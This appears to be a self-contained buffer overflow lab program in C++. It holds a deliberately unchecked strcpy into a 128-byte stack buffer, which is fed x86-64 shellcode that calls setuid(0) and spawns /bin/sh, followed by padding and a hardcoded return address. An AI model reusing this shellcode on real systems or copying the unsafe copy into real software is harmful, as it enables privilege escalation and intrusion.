#include<cstring>
#include<cstdio>
void overflow(char *str)
{
    char buf[128];
    memset(buf,0, sizeof(buf));
    strcpy(buf,str);
}
int main()
{
   char shellcode[256] = "\x48\x31\xc0\xb0\x69\x48\x31\xff\x0f\x05\x48\x31\xc0\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\xb0\x3b\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\xe2\xff\xff\xff\x7f";
   printf("%d\n", strlen(shellcode));   
   printf("%p\n", shellcode);   
   overflow(shellcode);  

   printf("hello world!\n");   
   return 0;
}



